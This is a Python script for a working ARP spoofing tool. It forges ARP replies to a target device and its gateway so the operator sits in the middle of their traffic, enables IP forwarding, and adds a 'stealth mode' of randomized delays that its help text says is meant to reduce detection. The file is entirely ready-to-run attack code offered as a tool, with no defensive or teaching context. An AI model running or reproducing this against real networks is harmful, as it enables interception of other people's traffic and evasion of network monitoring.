#!/usr/bin/env python3

import sys
import time
import random
import logging
import threading
import subprocess

import scapy.all as scapy
from argparse import ArgumentParser
from colorama import Fore, Style, init
from utilities.banner import print_banner
from utilities.vendor import VendorLookup

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write(
        "Please update and make sure you use the command python3 arp_spoof.py -t <target_ip> -g <gateway_ip>\n\n")
    sys.exit(0)

init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

vendor_lookup = VendorLookup(json_file_path="assets/mac-vendors-export.json")


def args():
    parser = ArgumentParser(description="------- A Tool to Perform ARP Spoofing to be MITM -------")
    parser.add_argument("-t", "--target", dest="target_address", help="Specify the IP address for your target device. "
                                                                      "Example: --target 192.168.1.7")
    parser.add_argument("-g", "--gateway", dest="gateway_address",
                        help="Specify the IP address of the gateway to spoof. Example: --gateway 192.168.1.1")
    parser.add_argument("-s", "--stealth", dest="stealth_mode", action="store_true",
                        help="Enable stealth mode to reduce detection likelihood.")
    options = parser.parse_args()
    if not options.target_address:
        parser.error("[-] Please specify the target IP address, or type it correctly, ex: -t 192.168.1.8")
    elif not options.gateway_address:
        parser.error("[-] Please specify the gateway IP address, or type it correctly, ex: -g 192.168.1.1")
    return options


def fetch_mac_address(ip_address, timeout=2, retries=3):
    for _ in range(retries):
        try:
            arp_request = scapy.ARP(op="who-has", pdst=ip_address)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            broadcast_arp_packets = broadcast / arp_request

            answered, unanswered = scapy.srp(broadcast_arp_packets, timeout=timeout, verbose=False, retry=10)

            devices_mac_list = []
            for sent_packet, received_packet in answered:
                if scapy.ARP in received_packet:
                    device_info = {"mac": received_packet[scapy.Ether].src}
                    devices_mac_list.append(device_info)

            if devices_mac_list:
                return devices_mac_list
        except Exception as e:
            logging.error(f"Error fetching MAC address for {ip_address}: {e}")
            time.sleep(1)
    return []


def spoof(target_ip, spoof_ip, stealth_mode=False):
    try:
        target_mac_address = fetch_mac_address(ip_address=target_ip)[0]["mac"]
        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
        scapy.send(arp_response, verbose=False)
        if stealth_mode:
            time.sleep(random.uniform(0.3, 1.0))  # randomized delay for stealth mode
    except Exception as e:
        logging.error(f"Error spoofing {target_ip}: {e}")


def restore(destination_ip, source_ip):
    try:
        destination_mac_address = fetch_mac_address(ip_address=destination_ip)[0]["mac"]
        source_mac_address = fetch_mac_address(ip_address=source_ip)[0]["mac"]
        arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
                                 hwsrc=source_mac_address)
        scapy.send(arp_response, verbose=False, count=4)
    except Exception as e:
        logging.error(f"Error restoring ARP table for {destination_ip}: {e}")


def spoof_target(target_ip, gateway_ip, stealth_mode):
    while True:
        spoof(target_ip=target_ip, spoof_ip=gateway_ip, stealth_mode=stealth_mode)
        time.sleep(random.uniform(1.5, 2.0))  # Randomized delay for stealth mode


def spoof_gateway(target_ip, gateway_ip, stealth_mode):
    while True:
        spoof(target_ip=gateway_ip, spoof_ip=target_ip, stealth_mode=stealth_mode)
        time.sleep(random.uniform(1.5, 2.0))  # Randomized delay for stealth mode


def print_side_by_side(target_ip, target_mac, target_vendor, gateway_ip, gateway_mac, gateway_vendor):
    target_info = (
        f"{Fore.GREEN}[+] Target Information:{Style.RESET_ALL}\n"
        f"    IP Address: {target_ip}\n"
        f"    MAC Address: {target_mac}\n"
        f"    Vendor: {target_vendor}"
    )
    gateway_info = (
        f"{Fore.BLUE}[+] Gateway Information:{Style.RESET_ALL}\n"
        f"    IP Address: {gateway_ip}\n"
        f"    MAC Address: {gateway_mac}\n"
        f"    Vendor: {gateway_vendor}"
    )

    # splitting strings into lines
    target_lines = target_info.split('\n')
    gateway_lines = gateway_info.split('\n')

    max_lines = max(len(target_lines), len(gateway_lines))
    for i in range(max_lines):
        target_line = target_lines[i] if i < len(target_lines) else ""
        gateway_line = gateway_lines[i] if i < len(gateway_lines) else ""
        print(f"{target_line.ljust(40)} {gateway_line}")


option = args()
target_ip_address = option.target_address
gateway_ip_address = option.gateway_address
stealth_mode = option.stealth_mode

print_banner()
packets_counter = 0

try:
    target_mac = fetch_mac_address(ip_address=target_ip_address)[0]["mac"]
    gateway_mac = fetch_mac_address(ip_address=gateway_ip_address)[0]["mac"]
    target_vendor = vendor_lookup.get_vendor(target_mac)
    gateway_vendor = vendor_lookup.get_vendor(gateway_mac)

    print_side_by_side(
        target_ip=target_ip_address,
        target_mac=target_mac,
        target_vendor=target_vendor,
        gateway_ip=gateway_ip_address,
        gateway_mac=gateway_mac,
        gateway_vendor=gateway_vendor
    )

    print(Fore.CYAN + "\n[+] Enabling IP Forwarding..." + Style.RESET_ALL)
    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print(Fore.CYAN + "[+] IP Forwarding Enabled" + Style.RESET_ALL)

    # start spoofing threads
    target_thread = threading.Thread(target=spoof_target, args=(target_ip_address, gateway_ip_address, stealth_mode))
    gateway_thread = threading.Thread(target=spoof_gateway, args=(target_ip_address, gateway_ip_address, stealth_mode))
    target_thread.daemon = True
    gateway_thread.daemon = True
    target_thread.start()
    gateway_thread.start()

    print(Fore.MAGENTA + "\n[+] ARP Spoofing Started. Press Ctrl+C to stop" + Style.RESET_ALL)
    while True:
        packets_counter += 2
        print(Fore.YELLOW + f"\r[+] Sent {packets_counter} ARP Spoofed Packet", end='', flush=True)
        time.sleep(1.7)
except KeyboardInterrupt:
    print(Fore.RED + "\n\n[!] Detected 'Ctrl + C'. Terminating..." + Style.RESET_ALL)
    print(Fore.RED + "[!] Cleaning up and restoring ARP tables..." + Style.RESET_ALL)
    for _ in range(3):
        restore(destination_ip=target_ip_address, source_ip=gateway_ip_address)
    print(Fore.RED + "[!] ARP tables restored. Exiting\n" + Style.RESET_ALL)
    sys.exit(0)
